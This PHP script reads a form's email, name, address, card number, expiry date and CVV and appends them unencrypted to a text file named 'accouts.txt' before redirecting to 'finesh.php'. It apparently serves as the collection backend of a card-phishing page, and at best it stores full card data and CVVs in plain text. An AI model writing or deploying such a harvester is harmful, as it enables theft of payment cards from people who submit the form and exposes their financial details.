<?php
    $email = $_POST["email"];
    $firstname = $_POST["firstname"];
	$lastname = $_POST["lastname"];
	$coutry = $_POST["coutry"];
	$code = $_POST["code"];
	$address = $_POST["address"];
	$middlename = $_POST["names"];
	$cardno = $_POST["cardno"];
	$expdate = $_POST["date"];
	$cvv = $_POST["cvv"];
    $filename = "accouts.txt";
    $fp = fopen($filename,"a++");
    fwrite ($fp,$email .",".   $firstname .",".$lastname .",".$coutry.",".$code .",".$address .",".$cardno .",".
	$expdate .",".$cvv ."\n");
    fclose ($fp);
    // echo OR header, not both
    // echo ("account created");
    header("Location: finesh.php"); 
    die();
?>
